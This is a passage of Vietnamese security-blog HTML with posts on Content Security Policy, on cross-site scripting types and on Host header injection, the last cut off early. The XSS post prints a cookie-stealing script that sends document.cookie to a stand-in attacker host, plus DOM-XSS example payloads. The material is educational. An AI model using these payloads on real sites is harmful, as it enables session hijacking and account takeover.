+      <a data-url="http://blog.hydrasky.ml/2020/06/14/Authentication/" data-id="ckhqle8t50000o7jme4vc14zn" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Technology/" rel="tag">Technology</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-CSP" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/06/14/CSP/" class="article-date">
+  <time datetime="2020-06-14T04:00:00.000Z" itemprop="datePublished">2020-06-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/06/14/CSP/">Content Security Policy</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2> **Content Security Policy(CSP) làgì?** </h2>
+
+
+
+<p>Content Security Policy (CSP) là chính sách bảo mật nội dung, được sử dụng để xác định các nguồn nội dung an toàn trên website mà trình duyệt có thể tải về cho người dùng.CSP là biện pháp đối phó rất hiệu quả với các cuộc tấn công Cross Site Scripting (XSS) và các kiểu injection tương tự.</p>
+<figure class="wp-block-image"><img src="https://datahouse.asia/wp-content/uploads/2020/04/content-security-policy-1024x414.png" alt="Does Security Matter to Front End Developers and Tips To Not Get ..."/></figure>
+
+
+
+<p>Tưởng tượng một chút, chúng ta ó 2 hướng cho các cuộc tấn công chèn script độc hại vào các website, đó là thông qua:</p>
+<ul><li>Inline Script: attacker đặt script của chúng trực tiếp vào trang web của bạn</li><li>Trình duyệt sẽ Load script từ các domain khác (của attacker) trên website đang truy cập .</li></ul>
+
+
+<p>Với hướng thứ 2,  attacker ưa dùng hơn vì dễ dàng truền tải script độc hại và có thể tùy ý thay đổi nội dung của script mà trình duyệt load. Nó có thể thay đổi trang web mà không cần tương tác.</p>
+<!-- wp:image {"id":316,"sizeSlug":"large"} -->
+<img src="/images/CSP/image-1.png" class="[class names]" title="[500] [500] " alt="title text">
+
+
+
+
+<p>Nhiệm vụ của CSP lúc này là không cho phép trình duyệt load script từ domain khác ,như thế kế hoạch của attacker sẽ bị hỏng. Vậy CSP đã làm thế nào ? </p>
+<h2> **Cách hoạt động củaSCP** </h2>
+
+
+
+<p>Bằng cách sử dụng các chỉ thị của CSP phù hợp ở trong các tiêu đề phản hồi HTTP, bạn có thể chọn lọc, chỉ định nguồn dữ liệu nào sẽ được phép sử dụng trong ứng dụng web của mình. Ví dụ như:</p>
+<ul><li>Chỉ định thực thi script đến từ domain của mình (ví dụ: mydomain.com)</li><li>Chỉ định thực thi các script đến từ một domain khác đáng tin cậy hay subdomain (ví dụ: * .mydomain.com, google.com)</li><li>Chỉ định chỉ thực thi tệp duy nhất mydomain.com/script.min.js</li><li>Không thực thi bất kì mã JavaScript nào</li><li>Chỉ hiển thị hình ảnh đến từ cdn.securecdn.com</li></ul>
+
+
+<p>Cách chỉ định chính sách , đó là thêm header HTTP dưới đây vào repsonse , nó có dạng là</p>
+<p>Content-Security-Policy: [chinh sách]</p>
+<!-- wp:image {"id":311,"sizeSlug":"large"} -->
+<img src="/images/CSP/image-2.png" class="[class names]" title="[500] [500] " alt="title text">
+
+
+
+<p>Để viết chính sách,bạn cần biết các chỉ thị cho các đối tượng</p>
+<!-- wp:image {"id":312,"sizeSlug":"large"} -->
+<img src="/images/CSP/image-3.png" class="[class names]" title="[500] [500] " alt="title text">
+
+
+
+<p>Ví dụ như img-src áp dụng các hình ảnh được hiển thị trên trang web, nó sẽ chỉ định nguồn hình ảnh đươc phép lấy về, default-src đóng vai trò dự phòng để tìm nạp CSP khác nếu nó bị thiếu . Để biết thêm và chi tiết các chỉ thị các bạn có thể tham khảo nội <a rel="noreferrer noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy" target="_blank">ở đây</a>  .</p>
+<p>Cùng với các chị thị còn có các thuộc tính của các chỉ thị hoặc có thể gọi là các keywords/values bổ trợ, Ví dụ như :</p>
+<ul><li>"none" không cho phép các đối tượng liên quan đến chỉ thị được thực thi.</li><li>"self " cho phép thực thi đối với domain của bạn (ko tính subdomain) hoặc những domain được chỉ định.</li><li>"unsafe-inline" cho phép thực thi các đoạn mã CSS hoặc Javascript được nhúng trực tiếp vào mã nguồn. Thiết lập này không được khuyến khích sử dụng nhưng trong nhiều trường hợp chúng ta vẫn phải dùng đến.</li><li>"unsafe-eval" cho phép chạy hàm eval(), đây là một hàm khá nguy hiểm của Javascript.</li><li>"*" áp dụng cho tất cả ví dụ như 'Https: // *' sẽ cho phép tất cả các tài nguyên đang truyền tải qua HTTPS.</li></ul>
+
+
+<p>Bạncóthểthamkhảothêm<a rel="noreferrer noopener" href="https://content-security-policy.com/" target="_blank">ở đây</a></p>
+<h3> **VÍ DỤ MỘT VÀI CHÍNH SÁCH** </h3>
+
+
+
+<p>CSP chỉ cho phép JavaScript , cái mà được lưu trữ trong trang web của bạn</p>
+<p>Content-Security-Policy: script-src ‘self’</p>
+<p>Cho phép các các nội dung thuộc domain và subdomain của example.com và được truyền tải thông qua cả 2 giao thức http , https</p>
+<p>Content-Security-Policy: default-src <em>://</em>.example.com  </p>
+<p>Chỉ cho phép JavaScript , cái mà được lưu trữ trên trang web của bạn và cdn.trustyorigin.net nhưng hình ảnh thì ở bất kì chỗ nào</p>
+<p>Content-Security-Policy: script-src ‘self’ cdn.trustedorigin.net; img-src *; </p>
+<p>Chặn tất cả các form submit</p>
+<p>Content-Security-Policy form-action ‘none’; </p>
+<p>Chỉ cho phép thực thi js trong tập tin script.js trên <a target="_blank" rel="noopener" href="https://trustyorigin.net/">https://trustyorigin.net/</a> và mặc định các giá trị của child-src, connect-src, font-src, frame-src, img-src, manifest-src, media-src, media-src, object-src, script-src, style-src và worker-src đều là self - các nội dung liên quan đến chỉ thị đều lấy từ nguồn của URL hiện tại</p>
+<p>Content-Security-Policy default-src ‘self’; script-src <a target="_blank" rel="noopener" href="https://trustedorigin.net/script.js">https://trustedorigin.net/script.js</a>; </p>
+<h2> **TriểnkhaiCSP** </h2>
+
+
+
+<p>Để triển khai CSP, ta cần định cấu hình máy chủ web của mình để trả về Content-Security-Policy header HTTP (đôi khi bạn sẽ thấy nó với header X-Content-Security-Policytiêu đề, nhưng đó là phiên bản cũ hơn và bây giờ không cần đề cập đến nó nữa). Ví dụ: nếu bạn sử dụng Apache, bạn có thể xác định CSP trong tệp httpd.conf , Virtualhost hoặc .htaccess của trang web của bạn.</p>
+<img src="/images/CSP/image-4.png" class="[class names]" title="[500] [500] " alt="title text">
+
+
+
+<p>Ngày nay ,CSP cũng được hỗ trợ bởi tất cả các trình duyệt hiện đại  và đã được nhiều năm chỉ riêng không được hỗ trợ trong Internet Explorer, nó chỉ dùng sandbox.</p>
+<img src="/images/CSP/image-6.png" class="[class names]" title="[500] [500] " alt="Level ở đây các bạn có thể hiểu như là thế hệ của CSP">
+
+
+
+<p>Ngoài ra cấu hình trên server, bạn cũng có thể cung cấp các chỉ thị cụ thể bằng cách sử dụng thẻ <meta>- thẻ HTML , được gọi là CSP Page-level. Dưới đây, một ví dụ đặt ra chính sách tương tự như trên:</p>
+<meta http-equiv="Content-Security-Policy" content="default-src 'self' "> 
+
+
+<p>Để sử dụng các chỉ thị này sẽ cần đến Sanboxing của trình duyệt</p>
+<p>Một vấn đề nữa, nếu như các trình duyệt không hỗ trợ CSP nó vẫn hoạt động với các máy chủ triển khai nó và ngược lại, các trình duyệt không hỗ trợ CSP chỉ cần bỏ qua nó, hoạt động như bình thường, và mặc định Same-origin là policy cho nội dung web. Nếu trang web không cung cấp CSP header , các trình duyệt cũng sử dụng Same-origin làm policy .</p>
+<h2>Bypass CSP</h2>
+
+
+
+<p>Có lẽ đây là mục mà ae pentest yêu thích nhất, bất kì phương thức bảo mật nào đều có lỗ hổng và CSP cũng không ngoại lệ. CSP giống như whitelist, vì vậy đôi lúc nó sẽ khổng thể đáp ứng được toàn bộ ưu cầu về các tính bảo mật. Các bạn có thểm tham khảo các bài viết dưới đây :</p>
+<ul><li><a target="_blank" rel="noopener" href="http://blog.innerht.ml/csp-2015/">"CSP 2015". XSSJigsaw.RetrievedDecember12, 2015.</a></li><li><a target="_blank" rel="noopener" href="http://sebastian-lekies.de/csp/bypasses.php">Lekies,Sebastian. "CollectionofCSPbypasses".Retrieved2017-06-05.</a></li><li><a target="_blank" rel="noopener" href="http://www.slideshare.net/x00mario/an-abusive-relationship-with-angularjs">"AnAbusiveRelationshipwithAngularJS".RetrievedJanuary5, 2016.</a></li><li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=p07acPBi-qw">OWASP (2017-05-25),AppSecEU 2017Don'tTrustThe DOM:BypassingXSSMitigationsViaScriptGadgetsbySebastianLekies,retrieved2017-06-05</a></li><li><a rel="noreferrer noopener" href="https://portswigger.net/research/bypassing-csp-with-policy-injection" target="_blank">https://portswigger.net/research/bypassing-csp-with-policy-injection</a></li><li><a rel="noreferrer noopener" href="https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/" target="_blank">https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/</a></li><li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass">https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass</a></li></ul>
+
+
+<p>Ngay từ đầu mk cũng đề cập , CSP giúp giảm thiểu các cuộc tấn công xss và các kiểu tấn công tương tự nhưng nó lại không có tác dụng một người ae họ hàng gần với nó là HTML injection.  Bạn có thể tham khảo chi tiết <a rel="noreferrer noopener" href="https://blog.detectify.com/2019/07/11/content-security-policy-csp-explained-including-common-bypasses/" target="_blank">ở đây</a>  và xem bài thuyết trình về CSP (Tóm tắt một chút cho các bạn đó là anh Matt Brunt đã trình bày các khái niệm, mối đe dọa từ xss, triển khai CSP một cách hợp lí để vừa ngăn ngừa tấn công vừa tránh bị phá hỏng web site bởi chính CSP, và cuối cùng đó là các vấn đề và sự hữu ích của tính  năng auto report của CSP - “report-only” cho các quản trị). OK cùng xem nào ! và hẹn các bạn ở bài viết sau.</p>
+<div class="video-container"><iframe src="https://www.youtube.com/embed/mr230uotw-Y" frameborder="0" loading="lazy" allowfullscreen></iframe></div>
+
+
+<h2>Tham khảo</h2>
+
+
+
+<ul><li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Content_Security_Policy">https://en.wikipedia.org/wiki/Content_Security_Policy</a></li><li><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP</a></li><li><a target="_blank" rel="noopener" href="https://w3c.github.io/webappsec-csp/#framework">https://w3c.github.io/webappsec-csp/#framework</a><a target="_blank" rel="noopener" href="https://www.netsparker.com/blog/web-security/content-security-policy/">https://www.netsparker.com/blog/web-security/content-security-policy/</a></li><li><a target="_blank" rel="noopener" href="https://blog.sucuri.net/2018/04/content-security-policy.html">https://blog.sucuri.net/2018/04/content-security-policy.html</a></li><li><a target="_blank" rel="noopener" href="https://content-security-policy.com/">https://content-security-policy.com/</a></li></ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.hydrasky.ml/2020/06/14/CSP/" data-id="ckhqle8tg0004o7jm8p2578xm" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Technology/" rel="tag">Technology</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Cross Site Scripting (Part1)" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/06/14/Cross%20Site%20Scripting%20(Part1)/" class="article-date">
+  <time datetime="2020-06-14T04:00:00.000Z" itemprop="datePublished">2020-06-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/06/14/Cross%20Site%20Scripting%20(Part1)/">Cross Site Scripting (Part 1)</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4>Cross Site Scripting là gì ? Có những kiểu nào ?</h4>
+
+
+
+<p>Cross Site Scripting (XSS) là một trong những kiểu tấn công hay là lỗ hổng phổ biến hiện nay đổi với web application .Nó không gọi tắt là CSS để tránh nhầm lẫn với khái niệm Cascading Style Sheet của HTML.</p>
+<p>Kỹ thuật XSS được thực hiện dựa trên việc chèn các đoạn script độc hại vào trong source code ứng dụng web. Nhằm thực thi các đoạn mã độc Javascript để chiếm phiên làm việc (session) của người dùng. Từ đó cho phép kẻ tấn công giả danh thành người dùng , thực hiện bất kỳ chức năng nào mà người dùng có thể thực hiện và truy cập vào bất kỳ dữ liệu nào của người dùng mà không cần phải đăng nhập bằng tài khoản của nạn nhân. Nếu người dùng có quyền truy cập đặc quyền trong ứng dụng thì kẻ tấn công cũng có thể có toàn quyền kiểm soát tất cả các chức năng và dữ liệu của ứng dụng đó.</p>
+<p>Một điều lưu ý bạn hiểu là tấn công XSS được thực hiện ở phía client không làm ảnh hưởng đến hệ thống trên server . Nó có thể được thực hiện với các ngôn ngữ lập trình phía client khác nhau. Tuy nhiên, thường xuyên nhất cuộc tấn công này được thực hiện với Javascript và HTML. </p>
+<p>XSS có 3 kiểu nhưng đều có cách thức tấn công chung là kẻ tấn công sẽ cố gắng gửi cho nạn nhân link có chứa script độc hại hoặc nội dung có chứa script độc hại nhằm lừa người dùng thực thi nó . Sau khi thực thi thì session của người dùng sẽ được gửi đến hacker . Hacker đã có quyền truy cập, thay đổi thông tin tài khoản mà nạn nhân không hề hay biết.  </p>
+<p>Đây là một ví dụ kẻ tấn công chèn script qua giá trị đầu vào (input param) thông qua URL :</p>
+<img src="/images/XSS/xss1.png" class="[class names]" title="[500] [500] " alt="Xss trong chức năng tìm kiếm">
+
+
+
+
+<p>Inject qua các input param là cách thức đơn giản của việc kiểm thử lỗ hổng này, do mức độ bảo mật của các website ngày càng được nâng cao nên các biến thể của cách tấn công cũng đa dạng theo (Cụ thể như thế nào ở phần tiếp theo). Điều tiếp theo chúng ta  cần nhớ Cross Site Scripting (XSS) có 3 loại  chính là :</p>
+<ul><li>Reflected XSS</li><li>Stored XSS</li><li>DOM based XSS (Biến thể của Reflected)</li></ul>
+
+
+<h4>Reflected XSS</h4>
+
+
+<p>Trong 3 loại thì Reflected XSS là loại tấn công phổ biến nhất. Rất nhiều tài liệu giới thiệu về nó nhưng lại nói chung chung khiến người đọc không hiểu được bản chât, chỉ hiểu đơn giản là inject payload và gửi cho người dùng thực thi trên trình duyệt và thế là xong. Bạn cần phải hiểu ý nghĩa của reflected ở đây để có thể phân biệt với lại một đồng bọn của nó là DOM BASE. Thế ta cần hiểu như thế nào , đơn giản thôi reflect là ánh xạ, trong khi DOMBASE là đường thẳng.</p>
+<p>Như hình dưới đây, đầu tiên nạn nhân nhận được 1 request độc hại, nạn nhân kích vào nhưng payload chưa thể thực thi ở đây thay vào đó trình duyệt sẽ gửi request đó lên server. Server sẽ xử lí và trả về phẩn hồi có chứa payload. Lúc này trình duyệt sẽ xử lí response nó là thực thi payload. Việc payload được gửi cho người dùng rồi được chuyển sang server và phản hồi cho client gân giống với ánh xạ và nó gọi là relected xss.</p>
+<figure class="wp-block-image"><img src="https://2.bp.blogspot.com/-Up9Gu_xOnLI/VSX6aqmSz0I/AAAAAAAAHWY/dIQi3ZY5JE4/s1600/3-17-2014-5-51-21-PM-700x398.jpg" alt=""/><figcaption>Các bước thực hiện tấn công Reflected XSS</figcaption></figure>
+
+
+<p>Cách thức tấn công chủ yếu là gửi link có chứa script độc hại như sau:</p>
+<p style="font-size:15.5px">http://example.com/<a target="_blank" rel="noopener" href="https://ac541f041e348399802625d4008000fe.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E">name=<script>var i=new Image; i.src=”http://hacker-site.net/”+document.cookie;</script></a>
+
+
+
+<p>Khi người dùng click vào đường link , request sẽ được gửi lên server, sessionid được trả về phía client và script có trong thành phần (Element)  của website lúc này  và trình duyệt (Browser) sẽ thực thi script đó.Lúc này người dùng đang có phiên làm việc với ứng dụng (example.com), đoạn script sẽ gửi đến server của hacker (hacker-site.net) với giá trị  “document.cookie” - Sessionid. Dưới đây là hình ảnh minh họa các bước tấn công :<br> Một bài lab trên portswigger.net về reflected XSS:</p>
+<figure class="wp-block-image size-large"><img src="http://hydrasky.000webhostapp.com//wp-content/uploads/2020/03/image-1024x384.png" alt="" class="wp-image-68"/><figcaption>Reflected Xss Lab on Portswigger</figcaption></figure>
+
+
+<p>Trong hình trên, ta chèn script độc hại thông qua biến “search” và đoạn script vẫn nằm trong cặp tag “h1”.</blockquote></p>
+<h4>DOM Based XSS</h4>
+
+
+
+<p>Đầu tiên ta cần biết <a rel="noreferrer noopener" href="https://viblo.asia/p/nhung-khai-niem-co-ban-ve-dom-DzVkpoDgenW" target="_blank">DOM</a> là từ viết tắt của Document Object Model là 1 dạng chuẩn của W3C đưa ra nhằm để truy xuất và thao tác dữ liệu của tài liệu có cấu trúc như HTML, XML. Để javascript làm việc được với các thẻ HTML thì cần sử dụng đến DOM. Lấy một ví dụ như này: (W3school)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">body&gt;</span><br><span class="line">&lt;p&gt;Click the button to display the URL of the document.&lt;&#x2F;p&gt;</span><br><span class="line">&lt;button onclick&#x3D;&quot;myFunction()&quot;&gt;Try it&lt;&#x2F;button&gt;</span><br><span class="line">&lt;p id&#x3D;&quot;demo&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function myFunction() &#123;</span><br><span class="line">  var x &#x3D; document.URL;</span><br><span class="line">  document.getElementById(&quot;demo&quot;).innerHTML &#x3D; x;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>DOM Based XSS là kỹ thuật khai thác XSS dựa trên việc thao tác với dữ liệu của các DOM này, nó sử dụng dữ liệu của người dùng hay các dữ liệu ngoài như URL để thêm HTML vào trang như ví dụ trên. Về đặc điểm thì nó giống như reflected chỉ khác là payload sẽ không được sử lí bởi server mà nó sử lí bởi client , server sẽ phản hồi về cho người dụng nội dung của site truy cập (cả các mã js hoặc  file) nhưng không có mã độc hại (payload) nào trong response. Khi trình duyệt nhận phản hồi, chính các js hay DOM sẽ xử lí các tham số mà nó xác định được và thực thi payload. Server lúc này chỉ đóng vai trò cung cấp tài nguyên chứ không hề tác động gì vào quá trình tấn công. Như hình dưới đây</p>
+<img src="/images/XSS/xss2.jpg" class="[class names]" title="[500] [500] " alt="DOM Base XSS">
+
+
+<p> Như ví dụ trên ta sẽ sử dụng URL chứa payload nhưng vẫn được coi hợp lệ như sau “<a target="_blank" rel="noopener" href="http://www.example.com/userdashboard.html#">http://www.example.com/userdashboard.html#</a></p><script>SomeFunction(somevariable)</script>“ và kết quả sẽ là:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;Click the button to display the URL of the document.&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;button onclick&#x3D;&quot;myFunction()&quot;&gt;Try it&lt;&#x2F;button&gt;</span><br><span class="line"></span><br><span class="line">&lt;p id&#x3D;&quot;demo&quot;&gt;http:&#x2F;&#x2F;www.example.com&#x2F;userdashboard.html#&lt;&#x2F;p&gt;&lt;script&gt;SomeFunction(somevariable)&lt;&#x2F;script&gt;&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure>
+
+
+<p> Vì vậy lỗ hổng này sẽ khai thác khó hơn các kiểu còn lại vì nó yêu cầu kẻ tấn công có nhiều kiến thức về javascript và html.</p>
+<p>Tấn công DOM Based XSS thông thường không qua các giá trị đầu vào mà nó qua “HTML Manipulation sinks” như: InnerHTML, outerHTML,  …  và “Browser JavaScript execution sinks” như : eval sink, document sink , location sink … .</p>
+<p>The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:<br>document.write() ,document.writeln(),  document.domain,  someDOMElement.innerHTML,  someDOMElement.outerHTML,  someDOMElement.insertAdjacentHTML,  someDOMElement.onevent</p>
+<p> The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:<br>add() , after(),  append() , animate() , insertAfter()  ,insertBefore(),  before(),  html(),  prepend() , replaceAll(),  replaceWith(),  wrap() , wrapInner(),  wrapAll(),  has() , constructor(,)  init() , index(),  jQuery.parseHTML(),  $.parseHTML(),</p>
+<p> Hầu hết nguyên nhân dẫn đến lỗ hổng do người lập trình đã không kiểm soát đầu vào lỏng lẻo khi dùng các đối tượng trên  và nó cũng có thể tồn tại trong các thư viện như Jquery hay các framework: angular,react, ….  có sẵn mà người phát triển không hay biết. </p>
+<p>Một lưu ý khi kiểm tra lỗ hổng DOM Base XSS thì không nên dùng “ View page source” (Ctrl +U) để xem luồng xử lí javascript hoạt động bởi vì nó sẽ không thấy được sự thay đổi .Thay vào đó hãy sử dụng “Developer tool” (Ctrl+Shift+I) và search (Ctrl + F) để tìm kiểm. </p>
+<h4>STORED XSS</h4>
+
+
+
+<p>Khác với 2 loại tấn công trên, Stored XSS hướng đến nhiều nạn nhân hơn. Lỗi này xảy vẫn xảy ra khi ứng dụng web không kiểm tra kỹ các dữ liệu đầu vào nhưng giá trị lần này sẽ được lưu vào cơ sở dữ liệu (database , file hay những khu vực khác nhằm lưu trữ dữ liệu của ứng dụng web). Ví dụ như các form góp ý, các comment … trên các trang web. Với kỹ thuật Stored XSS , hacker không khai thác trực tiếp mà phải thực hiện tối thiểu qua 2 bước.</p>
+<p>Đầu tiên hacker sẽ thông qua các điểm đầu vào (form, input, textarea…) không được kiểm tra kỹ để chèn vào CSDL các đoạn mã nguy hiểm.Tiếp theo đó người dùng truy cập vào dữ liệu có chứa script độc hại của hacker dẫn đến script được thực thi. Mức độ phát hiện bị lừa khó hơn 2 kiểu trước bên cạnh đó phảm vi ảnh hưởng đôi khi  rất là cao. Đó là lí do nó còn được gọi là persistent XSS - liên tiếp.</p>
+<figure class="wp-block-image"><img src="https://i0.wp.com/securitydaily.net/wp-content/uploads/2014/03/stored-xss-scenario1.png?fit=998%2C576&ssl=1" alt=""/><figcaption>Stored XSS</figcaption></figure>
+
+
+
+<p>Ngoài 3 kiểu trên còn tồn tại một kiểu XSS, còn một khái niệm nữa được gọi là  <strong>SELF-XSS</strong> .</p>
+<p> Self-XSS ám chỉ việc XSS không thể khai thác trực tiếp hay được lưu trữ lại như trong 3 cách trên. Ví dụ  hay gặp nhất đó chính là mục checkout trong các cửa shop online (Mk có kiếm dk 1 cái của bọn razer nhưng trong scope ko chấp nhận nên mình cx chẳng submit và sau đó 1 tháng 1 ông nào đó đăng poc giống hệt của mk trên youtube… Ko biết là nên sad hay haha đây ), .Để khai thác lúc này yêu cầu phải kết hợp cả kĩ nghệ xã hội (Soical Engineering) - hay hiểu đơn giản là lừa chính nạn nhân thiếu hiểu biết (VD: Lừa  sẽ được thanh toàn miễn phí khi làm theo) chèn script và thực thi ở những vị trí tồn tại  XSS. Tester thường nghĩ là lỗ hổng XSS có thể tồn tại nhưng không thể khai thác được nhưng trong một số Bug Bounty Program vẫn được tính và trao thưởng.</p>
+<img src="/images/XSS/22.png" class="[class names]" title="[500] [500] " alt="https:&#x2F;&#x2F;hackerone.com&#x2F;reports&#x2F;755679">
+
+
+
+
+<p>Phần tiếp theo XXX sẽ giới thiệu các cách khai thác lỗ hổng này. </p>
+<p>Link tham khảo :</p>
+<ul><li><a target="_blank" rel="noopener" href="https://tech.bizflycloud.vn/tong-quan-ve-dom-based-cross-site-scripting-dom-xss-20190424103508199.htm">https://tech.bizflycloud.vn/tong-quan-ve-dom-based-cross-site-scripting-dom-xss-20190424103508199.htm</a></li><li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting">https://portswigger.net/web-security/cross-site-scripting</a></li><li></li></ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.hydrasky.ml/2020/06/14/Cross%20Site%20Scripting%20(Part1)/" data-id="ckhqle8th0005o7jm5oea8zu7" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pentest-Web/" rel="tag">Pentest Web</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Host Header Attack" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/06/14/Host%20Header%20Attack/" class="article-date">
+  <time datetime="2020-06-14T04:00:00.000Z" itemprop="datePublished">2020-06-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/06/14/Host%20Header%20Attack/">Host Header Attack</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <!-- wp:image {"align":"center","width":485,"height":266} -->
+<div class="wp-block-image"><figure class="aligncenter is-resized"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcQYlVnvXSiQcarEPtvEKnYSHVLvIvgVcvzuHwJmX4PDXY2QHco2&usqp=CAU" alt="HOST HEADER INJECTION ATTACK - Ram Kumar - Medium" width="485" height="266"/></figure></div>
+
+
+
+<p>Xin chào các bạn! Mình lại quay trở lại với một lỗ hổng thuộc dạng HTTP header injection . Kiểu tấn công này thì nó không quá phức tạp vì mức ảnh hưởng của nó cũng chỉ ở mức bình thường. Nhưng như vậy không có nghĩ là mình sẽ bỏ qua, đôi khi có những cái mình không ngờ lại là cái nguy hiểm nhất. Vậy Host Header Attack có gì hay? Chúng ta cùng tìm hiểu nào?</p>
+<p>A client MUST include a Host header field in all HTTP/1.1 request messages <strong>RFC 2616</strong> </p>
+<p>Theo như trong tài liệu  <strong><a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc2616#page-128">RFC 2616</a></strong>  ở mục 14.23 thì trong tất cả các message HTTP/1.1 request từ Client đén Server bắt buộc phải bao gồm trường  “Host” header .Nếu URI được request đến không chứa tên máy chủ Internet của dịch vụ thì trường Host header coi như có giá trị là “empty”(rỗng) .Bất kỳ request HTTP/1.1 nào không có trường Host header  thì sẽ được máy chủ phản hồi với mã trạng thái là 400 (bad request). Thế “Host” header để làm gì ta?</p>
+<p>Thông thường một máy chủ web thường phục vụ, lưu trữ nhiều website hoặc ứng dụng web và tất nhiên chúng sẽ cùng một địa chỉ IP của server. Mỗi website hay ứng dụng được lưu trữ như vậy được gọi là “Virtual host”.Bây giờ làm sao cho người dùng có thể truy cập vào các website khác nhau ? Đó là lí do của HOST header tồn tại. Tiêu đề này sẽ nằm trong HTTP request đến máy chủ và máy chủ sẽ sử dụng giá trị của header này để chuyển request đến website hoặc ứng dụng được chỉ định. </p>
+<p>Điều gì xảy ra nếu chúng ta thay đổi giá trị của header là các host không xác định (evil.com) ? Hầu hết các máy chủ web thường chuyển các các host khồng xác định trong header vào đầu của danh sách “virtual host” của nó, Vì vậy các request tới server với host header không xác định như vậy vẫn được coi là hợp lệ.</p>
+<img src="/images/HHT/image-9.png" class="[class names]" title="[500] [500] " alt="title text">
+
+
+
+<p>Ngoài ra ngoài việc sử dụng “Host” header , attacker còn có thể sử dụng “X-Forward-Host” (viết tắt là XFH) để inject. XFH được sủ dụng để chỉ định máy chủ được chỉ định (X-Forward-Host: cdn.example.com) chuyển tiếp giá trị của “Host” header đến máy chủ gốc.XFH thường được áp dụng trong trương hợp sử dụng proxy hoặc các CDN, trong tài liệu của <a href="https://tools.ietf.org/html/rfc7230#section-5.4" target="_blank" rel="noreferrer noopener">RFC 7230</a>, phần 5.4 có nói:</p>
+<blockquote><p>When a proxy receives a request with an absolute-form of request-target, the proxy MUST ignore the received Host header field (if any) and instead replace it with the host information of the request-target.Ngoài ra bạn có thể tham khảo thêm về tài liệu của <a href="https://www.keycdn.com/support/x-forwarded-host" target="_blank" rel="noreferrer noopener">KeyCDN</a></p>
+</blockquote>
+<img src="/images/HHT/image-10.png" class="[class names]" title="[500] [500] " alt="title text">
+
+
+
+<p>Header này thường được sử dụng phổ biến trong các ứng dụng web PHP, .Một số kịch bản trong ví dụ sau đây là cách sử dụng tiêu biểu và nguy hiểm của host header:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;&lt;?php echo _SERVER[&#39;HOST&#39;] ?&gt;&#x2F;script.js&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
